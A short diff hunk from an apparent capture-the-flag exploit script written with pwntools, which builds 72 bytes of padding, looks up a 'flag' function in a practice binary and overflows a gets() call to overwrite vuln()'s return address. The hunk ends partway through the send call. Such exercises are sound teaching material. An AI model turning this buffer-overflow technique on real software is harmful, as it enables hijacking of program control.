@@ -14,9 +14,8 @@ p = s.process("./vuln")
 padding = b"AAAAAAAA" * 9
 
 # 2 find the address of the flag function
-e = ELF('./vuln_task3')
+e = ELF('./vuln_task4')
 flag_address = p64(e.symbols['flag']) # integer to bytes
-print(flag_address)
 
 # 3 exploit the gets() function to overflow and override the return address of vuln() to the address of flag()
 p.sendlineafter("Welcome to 64-bit. Give me a string that gets you the flag: \n",
